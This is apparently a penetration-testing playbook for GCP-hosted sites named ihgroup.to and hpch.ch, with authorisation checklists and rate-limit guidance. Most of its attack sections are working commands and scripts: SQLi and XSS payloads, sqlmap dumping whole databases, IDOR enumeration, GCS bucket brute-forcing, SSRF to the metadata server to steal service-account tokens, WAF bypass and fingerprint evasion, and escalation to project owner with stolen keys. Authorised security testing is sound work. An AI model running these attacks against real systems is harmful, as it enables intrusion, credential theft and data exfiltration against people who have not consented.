# Google Cloud Platform Reconnaissance Methodology
## Youness Pentest - Cloud-Specific Security Testing

**Target Platform**: Google Cloud Platform (Confirmed)
**Security Controls**: Cloud Armor (Expected), Cloud Firewall (Confirmed)
**Last Updated**: 2025-11-20

---

## Table of Contents
1. [GCP Infrastructure Overview](#gcp-infrastructure-overview)
2. [WAF/IDS Detection Strategy](#wafids-detection-strategy)
3. [Safe Scanning Practices](#safe-scanning-practices)
4. [Phase-by-Phase Methodology](#phase-by-phase-methodology)
5. [Cloud-Specific Attack Vectors](#cloud-specific-attack-vectors)
6. [Tools & Techniques](#tools--techniques)
7. [Rate Limiting & Safety](#rate-limiting--safety)

---

## GCP Infrastructure Overview

### Confirmed GCP Hosting

#### IP Address Verification (WHOIS)
| IP Address | Organization | NetRange | Allocated | Country |
|------------|--------------|----------|-----------|---------|
| 136.110.148.157 | Google LLC | 136.107.0.0/16 | 2024-08-01 | US |
| 34.8.134.55 | Google LLC | 34.4.5.0 - 34.63.255.255 | 2022-05-09 | US |

**Verification Commands**:
```bash
whois 136.110.148.157 | grep -E "(OrgName|NetRange|NetName)"
whois 34.8.134.55 | grep -E "(OrgName|NetRange|NetName)"

# Expected output:
# OrgName: Google LLC
# NetRange: 136.107.0.0 - 136.110.255.255
# NetName: GOOGLE
```

### Expected GCP Services

**Compute**:
- **Google Compute Engine** (GCE): VM instances
- **Google Kubernetes Engine** (GKE): Containerized apps
- **App Engine**: Managed application platform
- **Cloud Run**: Serverless containers

**Networking**:
- **Cloud Load Balancing**: L7 HTTP(S) Load Balancer likely
- **Cloud CDN**: Content delivery network
- **Cloud Armor**: DDoS protection and WAF
- **VPC**: Virtual Private Cloud networking

**Security**:
- **Cloud Armor Security Policies**: OWASP CRS v3.3 rules
- **Cloud Firewall**: Network-level filtering
- **Cloud IAM**: Access management
- **Security Command Center**: Threat detection

---

## WAF/IDS Detection Strategy

### Phase 1: Passive Header Analysis
**Risk Level**: 🟢 ZERO detection
**Tools**: curl, browser DevTools

```bash
# Inspect HTTP headers for GCP fingerprints
curl -I https://test.ihgroup.to
curl -I https://test.hpch.ch

# Headers indicating GCP:
# Server: Google Frontend
# Via: 1.1 google
# X-Cloud-Trace-Context: <trace-id>
# Alt-Svc: h3=":443"; ma=2592000  # QUIC/HTTP3 support
# X-Goog-* headers (various)
```

**GCP-Specific Headers**:
| Header | Meaning | Security Implication |
|--------|---------|---------------------|
| `Server: Google Frontend` | GCP Load Balancer | Fingerprints as GCP |
| `Via: 1.1 google` | Proxy/CDN layer | Requests pass through Google infrastructure |
| `X-Cloud-Trace-Context` | Distributed tracing | Confirms GCP Cloud Trace enabled |
| `Alt-Svc: h3=":443"` | QUIC support | Modern GCP setup |
| `X-Goog-Generation` | Cloud Storage | GCS bucket serving content |

### Phase 2: Automated WAF Detection
**Risk Level**: 🟡 LOW detection (non-intrusive)
**Tool**: wafw00f (confirmed to support Cloud Armor)

```bash
# Basic detection
wafw00f -v https://test.ihgroup.to
wafw00f -v https://test.hpch.ch

# Detailed analysis with output
wafw00f -v -a https://test.ihgroup.to -o waf_ihgroup.json -f json
wafw00f -v -a https://test.hpch.ch -o waf_hpch.json -f json

# Check wafw00f fingerprint database
wafw00f -l | grep -i google
# Should show: Google Cloud App Armor → Google Cloud
```

**Expected Detection Results**:
```
[*] Checking https://test.ihgroup.to
[+] The site is behind Google Cloud Armor (Google)
[+] Number of requests: 6
[+] Number of requests blocked: 0
```

### Phase 3: Nmap NSE Script Detection
**Risk Level**: 🟡 LOW to 🟠 MODERATE
**Tool**: nmap with http-waf-* scripts

```bash
# WAF detection via Nmap
nmap --script http-waf-detect -p 443 136.110.148.157
nmap --script http-waf-detect -p 443 34.8.134.55

# Comprehensive WAF fingerprinting
nmap --script http-waf-detect,http-waf-fingerprint \
  -p 80,443 136.110.148.157 \
  -oN nmap_waf_detection.txt
```

**NSE Script Indicators**:
- WAF name detection: "Google Cloud Armor"
- WAF confidence: High/Medium/Low
- Blocked request patterns
- Rate limiting behavior

### Phase 4: Behavioral Testing
**Risk Level**: 🟠 MODERATE to 🔴 HIGH (may trigger alerts)
**Purpose**: Confirm rate limiting and OWASP CRS rules

```bash
# Test 1: Rate limiting detection
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://test.ihgroup.to
  sleep 0.1  # 10 req/sec
done

# Expected: 200 OK for normal requests
# Possible: 429 Too Many Requests after threshold
# Possible: 403 Forbidden if scanner detected

# Test 2: OWASP CRS trigger tests (CAUTION)
# Simple XSS payload
curl "https://test.ihgroup.to/?q=<script>alert(1)</script>" -v

# SQLi payload
curl "https://test.ihgroup.to/?id=1' OR '1'='1" -v

# Path traversal
curl "https://test.ihgroup.to/../../etc/passwd" -v

# Expected if Cloud Armor enabled:
# - 403 Forbidden with Cloud Armor error page
# - X-Cloud-Armor-* headers in response
```

**⚠️ WARNING**: Only perform behavioral testing AFTER confirming other detection methods. Aggressive testing may trigger permanent IP bans.

### Phase 5: JA4 Fingerprint Analysis
**Risk Level**: 🟡 LOW
**Purpose**: Detect client fingerprinting (Cloud Armor advanced feature)

```bash
# Normal browser-like TLS handshake
curl --tlsv1.2 --tlsv1.3 https://test.ihgroup.to -v

# Scanner-like request (may get flagged)
curl --user-agent "sqlmap/1.7.2" https://test.ihgroup.to -v
curl --user-agent "Nmap Scripting Engine" https://test.ihgroup.to -v

# Compare response codes:
# 200 OK for browser-like = No JA4 fingerprinting
# 403 Forbidden for scanner = JA4 fingerprinting active
```

**Cloud Armor JA4 Capabilities**:
- TLS fingerprint analysis (ClientHello patterns)
- User-Agent validation
- Request header anomaly detection
- Bot management integration

---

## Safe Scanning Practices

### Google Cloud Acceptable Use Policy

**✅ ALLOWED** (for authorized testing):
- Security testing on resources you own/control
- Vulnerability scanning with proper authorization
- Penetration testing within defined scope
- Responsible disclosure of findings

**❌ PROHIBITED** (will result in account suspension):
- Denial of Service (DoS/DDoS) attacks
- Testing on Google-owned infrastructure without permission
- Unauthorized access attempts on third-party GCP resources
- Excessive traffic impacting shared infrastructure
- Malware distribution or C2 infrastructure hosting

**Official Policy**: https://cloud.google.com/terms/aup

### Google's Security Testing Requirements

**NO PRIOR NOTIFICATION REQUIRED** for:
- Testing resources you own/manage
- Authorized penetration testing
- Vulnerability assessments

**NOTIFICATION RECOMMENDED** for:
- Large-scale testing (>100k requests/hour)
- Tests that may impact service availability
- Third-party assessments on your behalf

**Contact**: Google Cloud Support (if issues arise)

### Recommended Scan Timing

#### Conservative (Cloud Armor DETECTED)
**Use when**: WAF confirmed, rate limiting observed, or initial testing
```bash
# Nmap timing: -T1 (Sneaky) or -T2 (Polite)
nmap -T2 -Pn --top-ports 1000 136.110.148.157

# Request rate: 5-10 requests/second
# Delay between requests: 100-200ms

# Nuclei configuration
nuclei -rl 5 --delay 500ms --timeout 10

# SQLMap configuration
sqlmap --delay=0.5 --threads=1
```

**Characteristics**:
- Very low network noise
- Minimal impact on monitoring/logging
- Reduced chance of IP blocking
- Slower results (trade-off for stealth)

#### Normal (No WAF DETECTED)
**Use when**: No defensive controls identified, or after testing initial response
```bash
# Nmap timing: -T3 (Default)
nmap -T3 -Pn --top-ports 1000 136.110.148.157

# Request rate: 10-20 requests/second
# Delay: 50-100ms

# Nuclei configuration
nuclei -rl 10 --delay 200ms

# SQLMap configuration
sqlmap --delay=0.2 --threads=2
```

**Characteristics**:
- Balanced speed and stealth
- Acceptable for most authorized testing
- Unlikely to trigger rate limiting
- Faster reconnaissance

#### Aggressive (Only with explicit permission)
**Use when**: Time-sensitive, explicit permission for aggressive testing
```bash
# Nmap timing: -T4 (Aggressive)
nmap -T4 -Pn --top-ports 1000 136.110.148.157

# Request rate: 50+ requests/second
# Minimal delay: 20-50ms

# Nuclei configuration
nuclei -rl 20 --delay 50ms

# SQLMap configuration
sqlmap --threads=5
```

**⚠️ CAUTION**:
- High chance of triggering IDS/IPS
- May cause temporary IP blocks
- Generates significant logs
- Only use with owner's explicit approval

---

## Phase-by-Phase Methodology

### Phase 0: Pre-Engagement (MANDATORY)
**Duration**: 15-30 minutes

```bash
# 1. Verify authorization
# - Confirm written permission from Youness
# - Document scope boundaries
# - Establish emergency contact

# 2. IP verification
whois 136.110.148.157
whois 34.8.134.55

# 3. Run T.K.V.F. framework
cd /home/kali/bbhk
./verify-tech.sh

# 4. Create evidence baseline
mkdir -p evidence_$(date +%Y%m%d)/baseline
curl -I https://test.ihgroup.to > evidence_$(date +%Y%m%d)/baseline/headers_ihgroup.txt
curl -I https://test.hpch.ch > evidence_$(date +%Y%m%d)/baseline/headers_hpch.txt
```

**Deliverables**:
- Authorization confirmation document
- IP ownership verification
- Baseline header captures
- T.K.V.F. completion

### Phase 1: Passive Reconnaissance
**Duration**: 2-4 hours
**Risk**: 🟢 ZERO detection

```bash
# DNS enumeration
dig test.ihgroup.to ANY +noall +answer
dig test.hpch.ch ANY +noall +answer
dig ihgroup.to NS
dig hpch.ch NS

# Subdomain discovery (passive sources only)
subfinder -d ihgroup.to -silent -o subdomains_ihgroup.txt
subfinder -d hpch.ch -silent -o subdomains_hpch.txt

# Verify GCP hosting for discovered subdomains
while read domain; do
  ip=$(dig +short "$domain" | head -1)
  echo "$domain -> $ip"
  whois "$ip" | grep -i google && echo "  [GCP CONFIRMED]"
done < subdomains_ihgroup.txt

# SSL/TLS certificate analysis
echo | openssl s_client -connect test.ihgroup.to:443 -showcerts 2>&1 | \
  openssl x509 -text -noout

# Extract Subject Alternative Names (SANs)
echo | openssl s_client -connect test.ihgroup.to:443 2>&1 | \
  openssl x509 -text | grep -A1 "Subject Alternative Name"

# Technology fingerprinting
whatweb -v https://test.ihgroup.to
whatweb -v https://test.hpch.ch

# Google Dorks (passive OSINT)
# Manually search:
# site:ihgroup.to
# site:hpch.ch
# "ihgroup.to" site:github.com
# "hpch.ch" inurl:config OR inurl:backup
```

**Expected Outputs**:
- Complete subdomain list (10-50 expected)
- SSL certificate chains with SANs
- Technology stack identification
- GCP service fingerprints
- No alerts or blocks

### Phase 2: Active Reconnaissance
**Duration**: 3-5 hours
**Risk**: 🟡 LOW to 🟠 MODERATE

```bash
# WAF/IDS detection (start conservative)
wafw00f -v -a https://test.ihgroup.to -o waf_results.json -f json

# *** DECISION POINT ***
# If Cloud Armor detected → Use -T2 timing for all scans
# If No WAF detected → Use -T3 timing

# Port scanning (adjust timing based on WAF detection)
TIMING="-T2"  # or -T3 if no WAF
nmap $TIMING -Pn --top-ports 1000 \
  -oA nmap_ihgroup_initial 136.110.148.157

# Service version detection on open ports
nmap $TIMING -Pn -sV \
  -p 80,443,8080,8443,3000,3306,5432,27017,6379 \
  -oA nmap_ihgroup_services 136.110.148.157

# Repeat for second IP
nmap $TIMING -Pn --top-ports 1000 \
  -oA nmap_hpch_initial 34.8.134.55

# HTTP probing of all discovered hosts
cat subdomains_ihgroup.txt subdomains_hpch.txt | \
  httpx -status-code -tech-detect -title -content-length \
  -threads 10 -rate-limit 10 \
  -o httpx_all_results.txt

# Screenshot interesting endpoints
cat httpx_all_results.txt | \
  grep -E "(200|301|302|401|403)" | \
  cut -d' ' -f1 > live_urls.txt

# Cloud-specific checks
# Check for GCS bucket exposure
curl -s https://storage.googleapis.com/ihgroup-assets
curl -s https://storage.googleapis.com/hpch-assets

# Check for App Engine endpoints
curl -H "Host: ihgroup.appspot.com" https://136.110.148.157
```

**Expected Outputs**:
- WAF confirmation (Cloud Armor: Yes/No)
- Open ports list (expect 80, 443 minimum)
- Running services with versions
- Live HTTP endpoints (200, 401, 403 status codes)
- Possible WAF false positives (403 on certain endpoints)

### Phase 3: Vulnerability Discovery
**Duration**: 5-10 hours
**Risk**: 🟠 MODERATE to 🔴 HIGH

```bash
# Nuclei scanning (template-based)
# Conservative approach if Cloud Armor detected
nuclei -l live_urls.txt \
  -t nuclei-templates/cves/2024/ \
  -t nuclei-templates/vulnerabilities/generic/ \
  -severity critical,high \
  -rl 5 -delay 500ms \
  -o nuclei_results_conservative.txt

# Medium aggressiveness if no WAF
nuclei -l live_urls.txt \
  -t nuclei-templates/ \
  -severity critical,high,medium \
  -rl 10 -delay 200ms \
  -o nuclei_results_normal.txt

# Database exposure testing
nmap -T2 -Pn -p 3306 --script mysql-info 136.110.148.157
nmap -T2 -Pn -p 5432 --script postgresql-info 34.8.134.55
nmap -T2 -Pn -p 27017 --script mongodb-info 136.110.148.157

# If database port open, attempt connection
mysql -h 136.110.148.157 -u root
psql -h 34.8.134.55 -U postgres

# Web application testing (manual)
# 1. Intercept traffic with Burp Suite
# 2. Map application functionality
# 3. Test for:
#    - SQL injection in search/filter parameters
#    - XSS in user input fields
#    - IDOR in API endpoints with IDs
#    - Authentication bypass
#    - CSRF on state-changing operations

# Automated XSS scanning
cat live_urls.txt | dalfox pipe --delay 200 -o xss_results.txt

# API endpoint discovery
ffuf -u https://test.ihgroup.to/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,307,401,403,405 \
  -rate 10 \
  -o ffuf_api_discovery.json

# GraphQL introspection (if GraphQL detected)
curl -X POST https://test.ihgroup.to/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{\n__schema{\ntypes{\nname\n}\n}\n}"}'
```

**Expected Findings**:
- CVE matches from nuclei (outdated software)
- Potential injection points
- API endpoints for further testing
- Misconfigurations
- Information disclosure

### Phase 4: Exploitation & PoC Development
**Duration**: 2-4 hours per vulnerability
**Risk**: 🔴 HIGH (only for confirmed vulnerabilities)

```bash
# SQL Injection PoC
sqlmap -u "https://test.ihgroup.to/search?q=test" \
  --level=3 --risk=2 \
  --batch --delay=0.5 --threads=1 \
  --dump-all --exclude-sysdbs

# IDOR enumeration script
for id in {1..1000}; do
  response=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.ihgroup.to/users/$id")
  echo "$id: $response" >> idor_enumeration_results.txt
  sleep 0.2  # Rate limiting
done

# XSS payload testing
# Reflected XSS
curl "https://test.ihgroup.to/search?q=<script>alert(document.domain)</script>"

# Stored XSS (via API)
curl -X POST https://test.ihgroup.to/api/comments \
  -H "Content-Type: application/json" \
  -d '{"text":"<img src=x onerror=alert(1)>"}'

# Authentication bypass attempts
# Test JWT "none" algorithm
# Test OAuth redirect manipulation
# Test session fixation
```

**Deliverables**:
- Working PoC code for each vulnerability
- Evidence screenshots
- HTTP request/response captures (Burp)
- Impact calculations

### Phase 5: Cloud-Specific Testing
**Duration**: 2-3 hours
**Risk**: 🟡 LOW to 🟠 MODERATE

```bash
# GCS bucket enumeration
# Common patterns:
curl -s https://storage.googleapis.com/ihgroup
curl -s https://storage.googleapis.com/ihgroup-backup
curl -s https://storage.googleapis.com/hpch-prod
curl -s https://storage.googleapis.com/hpch-assets

# Check bucket permissions
curl -s https://storage.googleapis.com/BUCKET_NAME/?list-type=2

# Cloud Functions enumeration
# Format: https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME
curl -s https://us-central1-ihgroup.cloudfunctions.net/api

# App Engine version enumeration
# Format: VERSION-dot-PROJECT_ID.REGION_ID.r.appspot.com
curl -H "Host: v1-dot-ihgroup.uc.r.appspot.com" https://136.110.148.157

# Cloud Run service discovery
# Usually at: https://SERVICE-PROJECT_ID-HASH-uc.a.run.app

# IAM policy testing (if API access)
# Test for overly permissive roles
gcloud projects get-iam-policy PROJECT_ID

# Metadata server SSRF (from vulnerable app)
curl http://metadata.google.internal/computeMetadata/v1/
curl http://metadata/computeMetadata/v1/instance/service-accounts/default/token
```

**Expected Findings**:
- Publicly accessible GCS buckets
- Exposed Cloud Functions
- SSRF to metadata server
- Misconfigured IAM permissions

### Phase 6: Documentation & Validation
**Duration**: 2-3 hours
**Risk**: 🟢 ZERO (read-only analysis)

```bash
# Store all findings in BBHK system
cd /home/kali/bbhk
./vuln store-quick

# AI validation using Critical Validator
# (Deploy via MCP commands - see below)

# Gemini expert review
gemini -y -p "Review this vulnerability for D.I.E. framework compliance:
Title: [Vulnerability title]
Description: [Full description]
PoC: [PoC code]
Impact: [Impact analysis]
Evidence: [Evidence summary]"

# Groky validation
cat vulnerability_report.md | groky-v2 "Is this finding technically accurate and impactful?"

# Organize evidence
mkdir -p deliverables/evidence_package
cp -r evidence_$(date +%Y%m%d)/* deliverables/evidence_package/
zip -r deliverables/youness_evidence_$(date +%Y%m%d).zip deliverables/evidence_package/
```

---

## Cloud-Specific Attack Vectors

### 1. Google Cloud Storage (GCS) Misconfigurations

**Common Bucket Naming Patterns**:
```
{company}
{company}-backup
{company}-prod
{company}-staging
{company}-assets
{company}-uploads
{company}-logs
{project}-{env}
```

**Testing Script**:
```bash
#!/bin/bash
# gcs_enum.sh
COMPANY="ihgroup"

PATTERNS=(
  "$COMPANY"
  "$COMPANY-backup"
  "$COMPANY-prod"
  "$COMPANY-staging"
  "$COMPANY-assets"
  "$COMPANY-uploads"
  "$COMPANY-logs"
  "$COMPANY-dev"
  "$COMPANY-test"
)

for bucket in "${PATTERNS[@]}"; do
  echo "[*] Testing: $bucket"
  response=$(curl -s "https://storage.googleapis.com/$bucket/")

  if [[ $response == *"<Error>"* ]]; then
    echo "  [-] Not found or access denied"
  else
    echo "  [+] ACCESSIBLE: https://storage.googleapis.com/$bucket/"
    echo "$response" > "bucket_${bucket}_content.xml"
  fi

  sleep 0.5
done
```

**Impact**: Exposed sensitive files, backups, credentials, user data

### 2. Cloud Metadata Server SSRF

**Attack Scenario**: SSRF vulnerability in application allows access to GCP metadata server

**Exploitation**:
```bash
# Via SSRF-vulnerable parameter
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Alternative endpoints
http://169.254.169.254/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/

# Enumerate service account
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get project metadata
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

**Required Header**: `Metadata-Flavor: Google`

**Impact**:
- Service account token theft
- Privilege escalation within GCP
- Access to project metadata
- Lateral movement to other GCP services

### 3. Cloud Armor Bypass Techniques

**Method 1: Origin IP Discovery**
```bash
# Find origin server IP behind Cloud Armor
# Common methods:
# 1. Historical DNS records (SecurityTrails, DNSDumpster)
# 2. SSL certificate transparency logs
# 3. Email headers (if service sends emails)
# 4. Subdomain enumeration (dev/staging might not have WAF)

# Test direct access
curl http://ORIGIN_IP/ -H "Host: test.ihgroup.to"

# If successful, bypass Cloud Armor entirely
```

**Method 2: HTTP Header Manipulation**
```bash
# X-Forwarded-For spoofing (if trusted)
curl -H "X-Forwarded-For: 127.0.0.1" https://test.ihgroup.to/admin

# X-Real-IP manipulation
curl -H "X-Real-IP: 127.0.0.1" https://test.ihgroup.to/admin

# Via: header manipulation (proxy bypass)
curl -H "Via: 1.1 google" https://test.ihgroup.to/restricted
```

**Method 3: Protocol Smuggling**
```bash
# HTTP/2 downgrade attacks
# Exploits differences between HTTP/2 and HTTP/1.1 parsing

# HTTP request smuggling (if backend misconfigured)
# CL.TE or TE.CL desync attacks
```

**⚠️ WARNING**: Only attempt bypass if testing defensive controls, not for malicious evasion

### 4. IAM Privilege Escalation (if compromised creds)

**Scenario**: Stolen GCP service account credentials or API keys

**Enumeration**:
```bash
# Authenticate with stolen credentials
gcloud auth activate-service-account --key-file=stolen_key.json

# Enumerate permissions
gcloud projects get-iam-policy PROJECT_ID

# List accessible resources
gcloud compute instances list
gcloud storage buckets list
gcloud functions list
gcloud sql instances list

# Attempt privilege escalation
gcloud iam service-accounts create pentester --display-name="Pentester"
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:pentester@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"
```

**Impact**: Full project compromise, lateral movement, data exfiltration

---

## Tools & Techniques

### Essential GCP Pentesting Tools

| Tool | Purpose | Installation | Usage |
|------|---------|--------------|-------|
| **wafw00f** | WAF detection | `apt install wafw00f` | `wafw00f https://target.com` |
| **nmap** | Port scanning | Pre-installed Kali | `nmap -T2 -Pn <ip>` |
| **httpx** | HTTP probing | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | `httpx -l urls.txt` |
| **subfinder** | Subdomain enum | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` | `subfinder -d domain.com` |
| **nuclei** | Vuln scanning | `go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` | `nuclei -u target.com` |
| **gcloud CLI** | GCP interaction | `snap install google-cloud-cli --classic` | `gcloud auth login` |
| **ScoutSuite** | GCP audit | `pip install scoutsuite` | `scout gcp` |
| **GCPBucketBrute** | Bucket enum | `git clone` | `python gcpbucketbrute.py` |

### Advanced Techniques

#### 1. Cloud Armor Rule Testing
```bash
# Systematically test OWASP CRS rules
# Rule categories in Cloud Armor:
# - SQLi: rule ID 942*
# - XSS: rule ID 941*
# - RCE: rule ID 932*
# - Path Traversal: rule ID 930*

# Example: SQLi rule testing
PAYLOADS=(
  "1' OR '1'='1"
  "admin'--"
  "1; DROP TABLE users--"
  "' UNION SELECT NULL--"
)

for payload in "${PAYLOADS[@]}"; do
  echo "[*] Testing: $payload"
  response=$(curl -s -w "%{http_code}" \
    "https://test.ihgroup.to/?id=$payload" -o /dev/null)
  echo "  Response: $response"
  [[ $response == "403" ]] && echo "  [BLOCKED]"
  sleep 1
done
```

#### 2. JA4 Fingerprint Evasion
```bash
# Rotate user agents to avoid fingerprinting
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

for ua in "${USER_AGENTS[@]}"; do
  curl -A "$ua" https://test.ihgroup.to/api/endpoint
  sleep 2
done

# Use different TLS configurations
curl --tlsv1.2 --ciphers ECDHE-RSA-AES128-GCM-SHA256 https://target.com
curl --tlsv1.3 https://target.com
```

#### 3. Rate Limit Profiling
```bash
# Determine exact rate limits
#!/bin/bash
# rate_limit_test.sh

URL="https://test.ihgroup.to"
MAX_REQUESTS=1000
DELAY=0.05  # 20 req/sec

blocked=0
for i in $(seq 1 $MAX_REQUESTS); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$URL")

  if [[ $code == "429" ]] || [[ $code == "403" ]]; then
    echo "[!] BLOCKED at request $i (code: $code)"
    blocked=$i
    break
  fi

  echo "[$i] $code"
  sleep $DELAY
done

if [[ $blocked -eq 0 ]]; then
  echo "[*] No rate limiting detected ($MAX_REQUESTS requests)"
else
  echo "[*] Rate limit threshold: ~$blocked requests in $((blocked * DELAY))s"
  echo "[*] Recommended rate: $((blocked / 60)) req/min"
fi
```

---

## Rate Limiting & Safety

### Safe Request Rates

| Scan Type | Conservative | Normal | Aggressive |
|-----------|--------------|--------|------------|
| **Nmap Port Scan** | -T1 (1 pkt/5s) | -T3 (1 pkt/0.4s) | -T4 (1 pkt/0.1s) |
| **HTTP Requests** | 5-10 req/sec | 10-20 req/sec | 50+ req/sec |
| **Nuclei Templates** | --rl 5 --delay 500ms | --rl 10 --delay 200ms | --rl 20 --delay 50ms |
| **SQLMap Testing** | --delay 0.5 --threads 1 | --delay 0.2 --threads 2 | --threads 5 |
| **API Enumeration** | 5 req/sec (ffuf -rate 5) | 10 req/sec | 20 req/sec |

### Monitoring for Blocks

**Signs of IP Blocking**:
- Repeated 403 Forbidden errors
- 429 Too Many Requests
- Connection timeouts
- Increased latency (>3x baseline)
- CAPTCHA challenges

**Response Protocol**:
1. **STOP all scanning immediately**
2. Wait 5-10 minutes
3. Test with single benign request
4. If still blocked:
   - Contact target owner (Youness)
   - Switch to VPN/proxy (only if authorized)
   - Reduce scan rate by 50%
5. Document blocking incident

### Emergency Stop Procedure

```bash
# Kill all active scans
pkill nmap
pkill nuclei
pkill sqlmap
pkill ffuf

# Check if IP is blocked
curl -I https://test.ihgroup.to

# Document incident
cat >> evidence_$(date +%Y%m%d)/incident_log.txt <<EOF
[$(date)] IP BLOCKING DETECTED
Target: https://test.ihgroup.to
Last tool: [tool name]
Last command: [command]
Response: [HTTP code/error]
Action: All scans stopped
Next steps: [planned recovery]
EOF

# Notify target owner
# [Contact Youness with incident details]
```

---

## Checklist: Pre-Scan Safety

Before starting ANY active scanning:
- [ ] Written authorization confirmed
- [ ] T.K.V.F. technology verification completed
- [ ] IP ownership verified (WHOIS → Google LLC)
- [ ] Passive recon completed successfully
- [ ] WAF/IDS detection performed
- [ ] Scan timing adjusted based on WAF results
- [ ] Rate limiting configured in all tools
- [ ] Emergency contact available (Youness)
- [ ] Evidence collection ready
- [ ] Incident response plan reviewed
- [ ] Backup testing plan (if primary blocked)

---

## Expected Results Summary

### Likely Configurations

**Based on standard GCP setups**:
- ✅ Cloud Armor enabled (OWASP CRS v3.3)
- ✅ Cloud Firewall restricting common attack ports
- ✅ HTTPS enforced with Google-managed certs
- ⚠️ Possible rate limiting (varies by app)
- ⚠️ JA4 fingerprinting (advanced setups only)
- ❌ Direct origin IP exposure (unlikely but possible)

### Recommended Scan Timeline

**Conservative Approach** (WAF detected):
- Day 1: Passive recon + WAF detection (4 hours)
- Day 2: Port scan + service enum (-T2) (5 hours)
- Day 3-4: Vuln assessment (nuclei conservative) (8 hours)
- Day 5-6: Manual testing + PoC (10 hours)

**Total**: ~27 hours over 6 days

**Normal Approach** (No WAF):
- Day 1: Passive + active recon (6 hours)
- Day 2: Full vuln scan (-T3, nuclei normal) (6 hours)
- Day 3-5: Manual testing + PoC (12 hours)

**Total**: ~24 hours over 5 days

---

## References

### Google Cloud Documentation
- **Cloud Armor**: https://cloud.google.com/armor/docs
- **Security Best Practices**: https://cloud.google.com/security/best-practices
- **Acceptable Use Policy**: https://cloud.google.com/terms/aup
- **Penetration Testing FAQ**: https://support.google.com/cloud/answer/6262505

### OWASP Resources
- **Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **Cloud Security**: https://owasp.org/www-project-cloud-security/
- **Top 10 (2021)**: https://owasp.org/Top10/

### Tool Documentation
- **wafw00f**: https://github.com/EnableSecurity/wafw00f
- **nuclei**: https://docs.projectdiscovery.io/tools/nuclei
- **httpx**: https://docs.projectdiscovery.io/tools/httpx
- **gcloud CLI**: https://cloud.google.com/sdk/gcloud

---

**Last Updated**: 2025-11-20
**Version**: 1.0
**Status**: ✅ Ready for deployment
